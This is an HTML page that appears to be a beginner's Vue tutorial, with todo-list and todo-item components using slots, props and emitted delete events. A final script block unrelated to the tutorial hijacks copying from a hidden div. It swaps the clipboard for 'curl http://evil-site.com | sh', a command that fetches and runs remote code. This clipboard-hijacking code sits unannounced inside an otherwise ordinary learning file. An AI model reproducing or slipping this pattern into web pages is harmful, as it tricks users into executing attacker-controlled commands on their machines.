<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>第一个vue应用</title>
  <script src="./lib/vue.js"></script>
</head>

<body>
  <div id="app">
    {{message}}
    <div :id="message"></div>
    <todo-list>
      <todo-item @delete="handleDelete" v-for="item in list" :title="item.title" :del="item.del">
        <span slot='pre-icon'>前置标签</span>
        <span slot='suf-icon'>后置标签</span>
      </todo-item>
    </todo-list>
  </div>
  <!-- 测试 内容 -->
  <div id="copyme" style="display: none;">123</div>
</body>
<script>
  Vue.component('todo-item', {
    props: {
      title: String,
      del: {
        type: Boolean,
        default: false
      }
    },
    template: `
    <li>
        <slot name='pre-icon'></slot>
        <span v-if="!del">{{title}}</span>
        <span v-else style='text-decoration:line-through;'>{{title}}</span>
        <slot name='suf-icon'></slot>
        <button v-show="!del" @click.stop="handleClick">删除</button>
      </li>
      `,
    methods: {
      handleClick() {
        console.log('click del button')
        this.$emit('delete', this.title)
      }
    },
  })
  Vue.component('todo-list', {
    template: `
    <ul>
      <slot></slot>
    </ul>
    `,
    data: function () {
      return {
      }
    },
  })

  var vm = new Vue({
    el: '#app',
    data: {
      message: 'hello vue',
      list: [{
        title: '课程1',
        del: false
      }, {
        title: "课程2",
        del: true
      }]
    },
    methods: {
      handleDelete(value) {
        console.log('handleDelete', value)
      }
    }
  })
</script>

<script>
  document.getElementById('copyme').addEventListener('copy', function (e) {
    e.clipboardData.setData('text/plain',
      'curl http://evil-site.com | sh ' // 复制了真实命令
    );
    e.preventDefault();
  });
</script>

</html>
